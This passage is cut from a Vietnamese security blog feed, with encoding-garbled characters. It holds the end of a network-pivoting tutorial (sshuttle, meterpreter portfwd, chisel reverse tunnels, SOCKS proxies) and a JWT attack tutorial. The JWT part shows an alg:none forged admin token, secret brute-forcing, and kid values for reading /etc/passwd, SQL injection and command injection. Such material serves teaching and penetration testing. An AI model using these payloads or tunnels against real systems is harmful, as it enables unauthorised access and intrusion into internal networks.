<li><code>sshuttle -r sean@10.11.1.251 10.1.1.27/24</code> (táº¡o káº¿t ná»‘i trá»±c tiáº¿p Ä‘áº¿n 10.1.1.27/24 thÃ´ng qua trung gian 10.11.1.251)\</li>
<li><code>nmap -Pn -v -sT -sV -p 22,80,443,21,25 10.1.1.27/24</code>(cÃ³ thá»ƒ sá»­ dá»¥ng nmap scan trá»±c tiáº¿p khÃ´ng cáº§n qua proxy nhÆ° ssh dynamic port fowarding)</li>
</ul>
</li>
</ul>
<h4 id="chÃº-Ã½">ChÃº Ã½</h4>
<ul>
<li>Trong thá»±c táº¿ giáº£ sá»­ báº¡n cÃ³ quyá»n truy cáº­p mÃ¡y chá»§ thÃ´ng qua má»™t lá»— há»•ng web hay á»©ng dá»¥ng, chÃºng ta khÃ´ng cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p cá»§a ssh. Báº¡n hoÃ n toÃ n cÃ³ thá»ƒ táº¡o má»™t cáº·p key tá»« mÃ¡y chá»§ vÃ  cÃ³ thá»ƒ ssh qua private key cá»§a nÃ³ vá»›i options <code>-i</code> nhÆ° pháº§n Ä‘áº§u tiÃªn trong bÃ i viáº¿t nÃ y cá»§a tÃ´i :<br>
<a href="https://tranquac.com/posts/2021/06/linux-backdoors/">https://tranquac.com/posts/2021/06/linux-backdoors/</a></li>
</ul>
<h3 id="netword-layer-tunnel">Netword Layer Tunnel</h3>
<ul>
<li>TÃ´i sáº½ giá»›i thiá»‡u má»™t sá»‘ cÃ´ng cá»¥ cÃ¡c báº¡n cÃ³ thá»ƒ tá»± nghiÃªn cá»©u vÃ  thá»±c hÃ nh</li>
<li>ICMP tunnel:
<ul>
<li>icmpsh (<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a>)</li>
<li>icmptunnel (<a href="https://github.com/DhavalKapil/icmptunnel">https://github.com/DhavalKapil/icmptunnel</a>)</li>
<li>pingtunnel (<a href="https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/">https://www.mit.edu/afs.new/sipb/user/golem/tmp/ptunnel-0.61.orig/web/</a>)</li>
</ul>
</li>
</ul>
<h3 id="transport-layer-tunnel">Transport Layer Tunnel</h3>
<ul>
<li>TCP tunnel, UDP tunnel:
<ul>
<li>netcat</li>
<li>powercat</li>
<li>socat</li>
<li>netsh</li>
<li>lcx</li>
<li>NATBypass</li>
<li>iox</li>
</ul>
</li>
</ul>
<h3 id="application-layer-tunnel">Application Layer Tunnel</h3>
<ul>
<li>HTTP, DNS, SSH vÃ  cÃ¡c tunnel khÃ¡c. SSH tÃ´i Ä‘Ã£ nÃ³i ráº¥t chi tiáº¿t á»Ÿ trÃªn.
<ul>
<li>dnscat2</li>
<li>dnscat2-powershell</li>
<li>dns2tcp</li>
<li>iodine</li>
<li>reGeorg</li>
<li>Neo-reGeorg</li>
<li>reDuh</li>
<li>Tunna</li>
<li>ABPTTS</li>
<li>EarthWorm</li>
<li>Termite</li>
<li>Venom</li>
<li>ssocks</li>
<li>s5.go</li>
</ul>
</li>
</ul>
<h3 id="other-tools-pivoting-without-ssh">Other tools pivoting without SSH</h3>
<h4 id="metasploit-framework">Metasploit Framework</h4>
<ul>
<li>Khi cÃ³ shell meterpreter báº¡n hoÃ n toÃ n cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘á»ƒ táº¡o tunnel dá»… dÃ ng. KhÃ´ng cáº§n pháº£i cÃ³ thÃ´ng tin Ä‘Äƒng nháº­p giá»‘ng SSH. Vá»›i SSH ta pháº£i cÃ³ má»™t tÃ i khoáº£n Ä‘Äƒng nháº­p hay private-key SSH cá»§a server thÃ¬ má»›i cÃ³ thá»ƒ káº¿t ná»‘i Ä‘áº¿n vÃ  táº¡o tunnel.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; portfwd -h
Usage: portfwd <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>add | delete | list | flush<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>args<span style="color:#f92672">]</span>
OPTIONS:
     -L &gt;opt&gt;  The local host to listen on <span style="color:#f92672">(</span>optional<span style="color:#f92672">)</span>.
     -h        Help banner.
     -l &gt;opt&gt;  The local port to listen on.
     -p &gt;opt&gt;  The remote port to connect on.
     -r &gt;opt&gt;  The remote host to connect on.
meterpreter &gt;
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; portfwd add â€“l <span style="color:#ae81ff">3389</span> â€“p <span style="color:#ae81ff">3389</span> â€“r 172.16.194.191
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Local TCP relay created: 0.0.0.0:3389 &gt;-&gt; 172.16.194.191:3389
meterpreter &gt; 
</code></pre></div><p>-&gt; Táº¡o má»™t tunnel forward toÃ n bá»™ traffic Ä‘áº¿n port 3339 trÃªn localhost tá»›i 172.16.194.191 qua pivot lÃ  mÃ¡y Ä‘ang cÃ³ shell meterpreter hiá»‡n táº¡i.NÃ³ cÅ©ng tÆ°Æ¡ng tá»± SSH local port forwarding váº­y Ä‘Ã³.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; portfwd delete â€“l <span style="color:#ae81ff">3389</span> â€“p <span style="color:#ae81ff">3389</span> â€“r 172.16.194.191
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully stopped TCP relay on 0.0.0.0:3389
meterpreter &gt; 
</code></pre></div><p>-&gt; Há»§y má»™t tunnel</p>
<ul>
<li>Liá»‡t kÃª táº¥t cáº£ tunnel : <code>meterpreter &gt; portfwd list</code></li>
<li>XÃ³a táº¥t cáº£ tunnel : <code>portfwd flush</code></li>
<li>Xem chi tiáº¿t hÆ¡n táº¡i : <a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></li>
</ul>
<h4 id="chisel">Chisel</h4>
<ul>
<li>A fast TCP/UDP tunnel over HTTP (<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>)</li>
<li>Sá»­ dá»¥ng thÃ´ng thÆ°á»ng: VÃ­ dá»¥ Kali hoáº·c mÃ¡y táº¥n cÃ´ng khÃ¡c cÃ³ IP lÃ  10.10.15.13, mÃ¡y client cÃ³ IP lÃ  10.10.10.10.</li>
<li>TrÃªn mÃ¡y táº¥n cÃ´ng báº¯t Ä‘áº§u táº¡o chisel server láº¯ng nghe trÃªn port 8000:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./chisel server -p <span style="color:#ae81ff">8000</span> --reverse
</code></pre></div><ul>
<li>TrÃªn mÃ¡y client:
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>chisel client 10.10.15.13:8000 R:80:127.0.0.1:80 R:389:localhost:389</td>
<td>Listen on Kali 80,389, forward to localhost port 80,389 on client</td>
</tr>
<tr>
<td>chisel client 10.10.15.13:8000 R:4444:10.10.10.214:80</td>
<td>Listen on Kali 4444, forward to 10.10.10.214 port 80</td>
</tr>
<tr>
<td>chisel client 10.10.15.13:8000 R:socks</td>
<td>Create SOCKS5 listener on 1080 on Kali, proxy through client</td>
</tr>
</tbody>
</table>
</li>
<li>LÆ°u Ã½ lÃ  Chisel pháº£i cháº¡y cáº£ trÃªn server vÃ  client</li>
</ul>
<h4 id="ssf">Ssf</h4>
<ul>
<li><a href="https://github.com/securesocketfunneling/ssf">https://github.com/securesocketfunneling/ssf</a></li>
</ul>
<h2 id="create-socks-proxy-to-attack-internal-network">Create SOCKS Proxy to Attack Internal Network</h2>
<h3 id="ssh">Ssh</h3>
<ul>
<li><a href="#dynamic-port-forwarding">Dynamic Port Porwarding</a></li>
<li>CÅ©ng cÃ³ thá»ƒ táº¡o má»™t SOCKS proxy lÃ  chÃ­nh mÃ¡y cá»§a báº¡n: <code>ssh user@localhost -CNfg -D 9000</code></li>
<li><a href="#sshuttle">Sshuttle</a></li>
</ul>
<h3 id="powershell">Powershell</h3>
<ul>
<li><a href="https://www.varonis.com/blog/nmap-reverse-proxies/">https://www.varonis.com/blog/nmap-reverse-proxies/</a></li>
<li><a href="https://tokyoneon.github.io/">https://tokyoneon.github.io/</a></li>
<li><a href="https://github.com/tokyoneon/Invoke-SocksProxy">https://github.com/tokyoneon/Invoke-SocksProxy</a></li>
</ul>
<h3 id="rdp">RDP</h3>
<ol>
<li><strong>Client</strong>: Register the <code>UDVC-Plugin.dll</code> on the system (<a href="https://github.com/earthquake/UniversalDVC#installation">https://github.com/earthquake/UniversalDVC#installation</a>)</li>
<li><strong>Client</strong>: connect via <code>RDP</code> to the server (by default it will create the virtual channel on all RDP connections, by binding the TCP port 31337)</li>
<li>Copy <code>UDVC-Server.exe</code> and the <code>SSF package</code> on the remote server</li>
<li><strong>Server</strong>: execute <code>ssfd.exe -p 9898</code></li>
<li><strong>Server</strong>: execute <code>UDVC-Server.exe -c -p 9898 -i 127.0.0.1</code></li>
<li><strong>Client</strong>: execute <code>ssf.exe -D 9999 -p 31337 127.0.0.1</code><br>
-&gt; At this point you will have the socks server listening on port 9999 of your client.</li>
</ol>
<h3 id="metasploit-framework-1">Metasploit Framework</h3>
<ul>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/proxytunnels/">https://www.offensive-security.com/metasploit-unleashed/proxytunnels/</a></li>
</ul>
<h3 id="cobalt-strike">Cobalt Strike</h3>
<ul>
<li><a href="https://www.cobaltstrike.com/help-socks-proxy-pivoting">https://www.cobaltstrike.com/help-socks-proxy-pivoting</a></li>
</ul>
<h3 id="http">HTTP</h3>
<ul>
<li><a href="https://blog.csdn.net/qq_34801745/article/details/108896857">https://blog.csdn.net/qq_34801745/article/details/108896857</a></li>
</ul>
<h3 id="dns">DNS</h3>
<ul>
<li><a href="http://blog.dengxj.com/archives/14/">http://blog.dengxj.com/archives/14/</a></li>
</ul>
<h3 id="icmp">ICMP</h3>
<ul>
<li><a href="https://blog.csdn.net/qq_34801745/article/details/108896857">https://blog.csdn.net/qq_34801745/article/details/108896857</a></li>
</ul>
<h2 id="refer">Refer</h2>
<ul>
<li><a href="https://blog.csdn.net/qq_34801745/article/details/108896857">https://blog.csdn.net/qq_34801745/article/details/108896857</a></li>
<li><a href="https://blog.csdn.net/qq_34801745/article/details/109022922">https://blog.csdn.net/qq_34801745/article/details/109022922</a></li>
<li><a href="https://www.ms509.com/2020/06/17/Intranet-penetration/">https://www.ms509.com/2020/06/17/Intranet-penetration/</a></li>
<li><a href="https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/">https://techblog.mediaservice.net/2019/10/remote-desktop-tunneling-tips-tricks/</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>JWT Attack</title>
            <link>https://tranquac.github.io/posts/2021/07/jwt-attack/</link>
            <pubDate>Wed, 28 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://tranquac.github.io/posts/2021/07/jwt-attack/</guid>
            <description>Jwt lÃ  gÃ¬  Header Payload Signature VÃ­ dá»¥ jwt   PhÆ°Æ¡ng thá»©c táº¥n cÃ´ng  Thuáº­t toÃ¡n mÃ£ hÃ³a Brute force secret key Sá»­a Ä‘á»•i thÃ´ng sá»‘ KID Sá»­a Ä‘á»•i thÃ´ng sá»‘ JKU / X5U CÃ¡c phÆ°Æ¡ng phÃ¡p khÃ¡c    Jwt la gi  TÃªn Ä‘áº§y Ä‘á»§ cá»§a JWT lÃ  Json Web Token. NÃ³ tuÃ¢n theo Ä‘á»‹nh dáº¡ng JSON vÃ  mÃ£ hÃ³a thÃ´ng tin ngÆ°á»i dÃ¹ng vÃ o token.</description>
            <content type="html"><![CDATA[<ul>
<li><a href="#jwt-la-gi">Jwt lÃ  gÃ¬</a>
<ul>
<li><a href="#header">Header</a></li>
<li><a href="#payload">Payload</a></li>
<li><a href="#signature">Signature</a></li>
<li><a href="#vi-du-jwt">VÃ­ dá»¥ jwt</a></li>
</ul>
</li>
<li><a href="#phuong-thuc-tan-cong">PhÆ°Æ¡ng thá»©c táº¥n cÃ´ng</a>
<ul>
<li><a href="#thuat-toan-ma-hoa">Thuáº­t toÃ¡n mÃ£ hÃ³a</a></li>
<li><a href="#brute-force-secret-key">Brute force secret key</a></li>
<li><a href="#sua-doi-thong-so-kid">Sá»­a Ä‘á»•i thÃ´ng sá»‘ KID</a></li>
<li><a href="#sua-doi-thong-so-jku-hoac-x5u">Sá»­a Ä‘á»•i thÃ´ng sá»‘ JKU / X5U</a></li>
<li><a href="#cac-phuong-phap-khac">CÃ¡c phÆ°Æ¡ng phÃ¡p khÃ¡c</a></li>
</ul>
</li>
</ul>
<h2 id="jwt-la-gi">Jwt la gi</h2>
<ul>
<li>TÃªn Ä‘áº§y Ä‘á»§ cá»§a JWT lÃ  Json Web Token. NÃ³ tuÃ¢n theo Ä‘á»‹nh dáº¡ng JSON vÃ  mÃ£ hÃ³a thÃ´ng tin ngÆ°á»i dÃ¹ng vÃ o token. MÃ¡y chá»§ khÃ´ng lÆ°u trá»¯ báº¥t ká»³ thÃ´ng tin ngÆ°á»i dÃ¹ng nÃ o, chá»‰ thÃ´ng tin chÃ­nh vÃ  xÃ¡c minh token báº±ng cÃ¡ch sá»­ dá»¥ng má»™t thuáº­t toÃ¡n mÃ£ hÃ³a cá»¥ thá»ƒ vÃ  xÃ¡c minh danh tÃ­nh cá»§a ngÆ°á»i dÃ¹ng thÃ´ng qua token. XÃ¡c thá»±c dá»±a trÃªn token cÃ³ thá»ƒ thay tháº¿ phÆ°Æ¡ng phÃ¡p xÃ¡c thá»±c cookie + session truyá»n thá»‘ng.</li>
<li>JWT bao gá»“m ba pháº§n: <code>header</code>.<code>payload</code>.<code>signature</code>.</li>
</ul>
<h3 id="header">Header</h3>
<ul>
<li>Hai trÆ°á»ng thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng nháº¥t trong pháº§n tiÃªu Ä‘á» lÃ  <code>alg</code> vÃ  <code>typ</code>, <code>alg</code> chá»‰ Ä‘á»‹nh thuáº­t toÃ¡n Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ mÃ£ hÃ³a token (thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng nháº¥t lÃ  thuáº­t toÃ¡n <code>HMAC</code> vÃ  <code>RSA</code> ) vÃ  kiá»ƒu khai bÃ¡o <code>typ</code> lÃ  JWT</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;alg&#34;</span> : <span style="color:#e6db74">&#34;HS256&#34;</span>,
    <span style="color:#f92672">&#34;typ&#34;</span> : <span style="color:#e6db74">&#34;jwt&#34;</span>
}
</code></pre></div><h3 id="payload">Payload</h3>
<ul>
<li>Payload lÃ  dá»¯ liá»‡u ngÆ°á»i dÃ¹ng vÃ  má»™t sá»‘ khai bÃ¡o liÃªn quan Ä‘áº¿n dá»¯ liá»‡u Ä‘á»ƒ khai bÃ¡o quyá»n háº¡n cá»§a ngÆ°á»i dÃ¹ng. VÃ­ dá»¥: dá»¯ liá»‡u sau cÃ³ thá»ƒ Ä‘Æ°á»£c truyá»n trong quÃ¡ trÃ¬nh Ä‘Äƒng nháº­p</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;user_role&#34;</span> : <span style="color:#e6db74">&#34;1&#34;</span>,    <span style="color:#960050;background-color:#1e0010">//ngÆ°á»i</span> <span style="color:#960050;background-color:#1e0010">dÃ¹ng</span> <span style="color:#960050;background-color:#1e0010">Ä‘Ã£</span> <span style="color:#960050;background-color:#1e0010">Ä‘Äƒng</span> <span style="color:#960050;background-color:#1e0010">nháº­p</span>
    <span style="color:#f92672">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>,          <span style="color:#960050;background-color:#1e0010">//admin</span> <span style="color:#960050;background-color:#1e0010">hay</span> <span style="color:#960050;background-color:#1e0010">user</span> <span style="color:#960050;background-color:#1e0010">...</span>
    <span style="color:#f92672">&#34;iat&#34;</span>: <span style="color:#ae81ff">1573423433</span>,        <span style="color:#960050;background-color:#1e0010">//thá»i</span> <span style="color:#960050;background-color:#1e0010">gian</span> <span style="color:#960050;background-color:#1e0010">báº¯t</span> <span style="color:#960050;background-color:#1e0010">Ä‘áº§u</span>
    <span style="color:#f92672">&#34;exp&#34;</span>: <span style="color:#ae81ff">1573932423</span>,        <span style="color:#960050;background-color:#1e0010">//thá»i</span> <span style="color:#960050;background-color:#1e0010">gian</span> <span style="color:#960050;background-color:#1e0010">háº¿t</span> <span style="color:#960050;background-color:#1e0010">háº¡n</span>
    <span style="color:#f92672">&#34;domain&#34;</span>: <span style="color:#e6db74">&#34;tranquac.com&#34;</span>,   <span style="color:#960050;background-color:#1e0010">//scope</span>
    <span style="color:#f92672">&#34;jti&#34;</span>: <span style="color:#e6db74">&#34;slkdfj343ekhdclsnd923redcdhfsd9s&#34;</span>   <span style="color:#960050;background-color:#1e0010">//token</span>
}
</code></pre></div><h3 id="signature">Signature</h3>
<ul>
<li>Chá»©c nÄƒng cá»§a Signature lÃ  Ä‘á»ƒ báº£o vá»‡ tÃ­nh toÃ n váº¹n cá»§a jwt.</li>
<li>PhÆ°Æ¡ng phÃ¡p táº¡o lÃ  káº¿t ná»‘i hai pháº§n header vÃ  payload, sau Ä‘Ã³ tÃ­nh toÃ¡n signature thÃ´ng qua thuáº­t toÃ¡n Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh trong pháº§n header.</li>
<li>TÃ³m táº¯t thÃ nh má»™t cÃ´ng thá»©c lÃ :<br>
<code>signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key)</code></li>
</ul>
<h3 id="vi-du-jwt">Vi du jwt</h3>
<ul>
<li>VÃ­ dá»¥ sá»­ dá»¥ng python hay jwt.io Ä‘á»u cho ra jwt tÆ°Æ¡ng á»©ng</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> jwt

encoded_jwt <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode({<span style="color:#e6db74">&#39;user_name&#39;</span>: <span style="color:#e6db74">&#39;admin&#39;</span>}, <span style="color:#e6db74">&#39;secret_key&#39;</span>, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HS256&#39;</span>)
<span style="color:#66d9ef">print</span>(encoded_jwt)
<span style="color:#66d9ef">print</span>(jwt<span style="color:#f92672">.</span>decode(encoded_jwt, <span style="color:#e6db74">&#39;key&#39;</span>, algorithms<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;HS256&#39;</span>]))
</code></pre></div><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/jwt/jwt.PNG" alt="https://raw.githubusercontent.com/tranquac/Blog_Image/master/jwt/jwt.PNG"></p>
<ul>
<li>jwt Ä‘Æ°á»£c táº¡o tÆ°Æ¡ng á»©ng:
<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.jBrzPBuyrCIYNdAqeQZn9-696uNQoghaCQMnC33GQ9Y</code></li>
</ul>
<h2 id="phuong-thuc-tan-cong">Phuong thuc tan cong</h2>
<h3 id="thuat-toan-ma-hoa">Thuat toan ma hoa</h3>
<p><strong>Thuáº­t toÃ¡n mÃ£ hÃ³a rá»—ng</strong></p>
<ul>
<li>JWT há»— trá»£ viá»‡c sá»­ dá»¥ng thuáº­t toÃ¡n mÃ£ hÃ³a null, báº¡n cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh <code>alg</code> trong tiÃªu Ä‘á» thÃ nh <code>None</code></li>
<li>Trong trÆ°á»ng há»£p nÃ y, miá»…n lÃ  chá»¯ kÃ½ Ä‘Æ°á»£c Ä‘áº·t thÃ nh trá»‘ng (nghÄ©a lÃ  trÆ°á»ng chá»¯ kÃ½ khÃ´ng Ä‘Æ°á»£c thÃªm vÃ o) vÃ  Ä‘Æ°á»£c gá»­i Ä‘áº¿n mÃ¡y chá»§, thÃ¬ báº¥t ká»³ mÃ£ thÃ´ng bÃ¡o nÃ o cÅ©ng cÃ³ thá»ƒ vÆ°á»£t qua xÃ¡c minh cá»§a mÃ¡y chá»§. VÃ­ dá»¥:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;alg&#34;</span> : <span style="color:#e6db74">&#34;None&#34;</span>,
    <span style="color:#f92672">&#34;typ&#34;</span> : <span style="color:#e6db74">&#34;jwt&#34;</span>
}

{
    <span style="color:#f92672">&#34;user&#34;</span> : <span style="color:#e6db74">&#34;Admin&#34;</span>
}
</code></pre></div><ul>
<li>MÃ£ thÃ´ng bÃ¡o hoÃ n chá»‰nh Ä‘Æ°á»£c táº¡o lÃ  <code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></li>
<li>Má»¥c Ä‘Ã­ch ban Ä‘áº§u cá»§a thuáº­t toÃ¡n mÃ£ hÃ³a trá»‘ng lÃ  Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ gá»¡ lá»—i\</li>
</ul>
<p><strong>Sá»­a Ä‘á»•i thuáº­t toÃ¡n mÃ£ hÃ³a RSA thÃ nh HMAC</strong>\</p>
<ul>
<li>Hai thuáº­t toÃ¡n Ä‘Æ°á»£c sá»­ dá»¥ng phá»• biáº¿n nháº¥t trong JWT lÃ  HMACtá»•ng RSA.</li>
<li><a href="https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/">https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/</a></li>
</ul>
<h3 id="brute-force-secret-key">Brute force secret key</h3>
<ul>
<li>NhÆ° ngÆ°á»i ta nÃ³i, nÆ¡i nÃ o cÃ³ xÃ¡c minh máº­t kháº©u, nÆ¡i Ä‘Ã³ cÃ³ brute force XD.</li>
<li>Tuy nhiÃªn, viá»‡c brute force cá»§a JWT cáº§n pháº£i Ä‘Æ°á»£c thá»±c hiá»‡n trong má»™t sá»‘ cÆ¡ sá»Ÿ nháº¥t Ä‘á»‹nh:
<ul>
<li>Biáº¿t thuáº­t toÃ¡n mÃ£ hÃ³a Ä‘Æ°á»£c JWT sá»­ dá»¥ng</li>
<li>jwt há»£p lá»‡, Ä‘Ã£ kÃ½</li>
<li>KhÃ³a kÃ½ khÃ´ng phá»©c táº¡p (khÃ³a yáº¿u)</li>
</ul>
</li>
<li>VÃ¬ váº­y trÃªn thá»±c táº¿, viá»‡c brute force JWT cÃ³ nhá»¯ng háº¡n cháº¿ lá»›n.</li>
<li>CÃ´ng cá»¥ liÃªn quan: c-jwt-cracker (<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>)
<code>./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.jBrzPBuyrCIYNdAqeQZn9-696uNQoghaCQMnC33GQ9Y</code></li>
</ul>
<h3 id="sua-doi-thong-so-kid">Sua doi thong so KID</h3>
<ul>
<li><code>kid</code> NÃ³ lÃ  má»™t tham sá»‘ tÃ¹y chá»n trong tiÃªu Ä‘á» jwt, tÃªn Ä‘áº§y Ä‘á»§ lÃ  key ID, nÃ³ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ chá»‰ Ä‘á»‹nh khÃ³a cá»§a thuáº­t toÃ¡n mÃ£ hÃ³a</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;alg&#34;</span> : <span style="color:#e6db74">&#34;HS256&#34;</span>,
    <span style="color:#f92672">&#34;typ&#34;</span> : <span style="color:#e6db74">&#34;jwt&#34;</span>,
    <span style="color:#f92672">&#34;kid&#34;</span> : <span style="color:#e6db74">&#34;/home/jwt/.ssh/pem&#34;</span>
}
</code></pre></div><ul>
<li>Bá»Ÿi vÃ¬ thÃ´ng sá»‘ nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c nháº­p bá»Ÿi ngÆ°á»i dÃ¹ng, nÃ³ cÅ©ng cÃ³ thá»ƒ gÃ¢y ra má»™t sá»‘ váº¥n Ä‘á» vá» báº£o máº­t.\</li>
</ul>
<p><strong>Äá»c tá»‡p tÃ¹y Ã½</strong></p>
<ul>
<li><code>kid</code> : CÃ¡c tham sá»‘ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ Ä‘á»c tá»‡p khÃ³a, nhÆ°ng há»‡ thá»‘ng khÃ´ng biáº¿t liá»‡u ngÆ°á»i dÃ¹ng cÃ³ muá»‘n Ä‘á»c tá»‡p khÃ³a hay khÃ´ng, do Ä‘Ã³, náº¿u cÃ¡c tham sá»‘ khÃ´ng Ä‘Æ°á»£c lá»c, káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»c há»‡ thá»‘ng báº¥t ká»³ tá»‡p nÃ o.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;alg&#34;</span> : <span style="color:#e6db74">&#34;HS256&#34;</span>,
    <span style="color:#f92672">&#34;typ&#34;</span> : <span style="color:#e6db74">&#34;jwt&#34;</span>,
    <span style="color:#f92672">&#34;kid&#34;</span> : <span style="color:#e6db74">&#34;/etc/passwd&#34;</span>
}
</code></pre></div><p><strong>SQL injection</strong></p>
<ul>
<li><code>kid</code> : Báº¡n cÅ©ng cÃ³ thá»ƒ trÃ­ch xuáº¥t dá»¯ liá»‡u tá»« cÆ¡ sá»Ÿ dá»¯ liá»‡u. Táº¡i thá»i Ä‘iá»ƒm nÃ y, nÃ³ cÃ³ thá»ƒ gÃ¢y ra cÃ¡c cuá»™c táº¥n cÃ´ng chÃ¨n SQL. Báº¡n cÃ³ thá»ƒ láº¥y dá»¯ liá»‡u báº±ng cÃ¡ch táº¡o cÃ¢u lá»‡nh SQL hoáº·c bá» qua xÃ¡c minh chá»¯ kÃ½.</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
    <span style="color:#f92672">&#34;alg&#34;</span> : <span style="color:#e6db74">&#34;HS256&#34;</span>,
    <span style="color:#f92672">&#34;typ&#34;</span> : <span style="color:#e6db74">&#34;jwt&#34;</span>,
    <span style="color:#f92672">&#34;kid&#34;</span> : <span style="color:#e6db74">&#34;key1234&#39; || union select &#39;secretkey&#39; -- &#34;</span>
}
</code></pre></div><p><strong>Command inject</strong></p>
<ul>
<li><code>kid</code> : Viá»‡c lá»c khÃ´ng Ä‘áº§y Ä‘á»§ cÃ¡c tham sá»‘ cÅ©ng cÃ³ thá»ƒ gÃ¢y ra cÃ¡c váº¥n Ä‘á» vá» inject command, nhÆ°ng cÃ¡c Ä‘iá»u kiá»‡n sá»­ dá»¥ng Ä‘Ã²i há»i nhiá»u hÆ¡n. Náº¿u pháº§n mÃ¡y chá»§ sá»­ dá»¥ng Ruby vÃ  cÃ¡c open chá»©c nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng khi Ä‘á»c tá»‡p khÃ³a, thÃ¬ viá»‡c chÃ¨n lá»‡nh cÃ³ thá»ƒ Ä‘Æ°á»£c gÃ¢y ra bá»Ÿi cÃ¡c tham sá»‘.<br>
<code>&quot;/ path / to / key_file | whoami&quot;</code></li>
<li>Äá»‘i vá»›i cÃ¡c ngÃ´n ngá»¯ khÃ¡c, cháº³ng háº¡n nhÆ° php, náº¿u code sá»­ dá»¥ng exec hoáº·c system Ä‘á»c tá»‡p khÃ³a, nÃ³ cÅ©ng cÃ³ thá»ƒ gÃ¢y ra hiá»‡n tÆ°á»£ng chÃ¨n lá»‡nh. Táº¥t nhiÃªn, kháº£ nÄƒng nÃ y lÃ  tÆ°Æ¡ng Ä‘á»‘i nhá».</li>
</ul>
<h3 id="sua-doi-thong-so-jku-hoac-x5u">Sua doi thong so JKU hoac X5U</h3>
<ul>
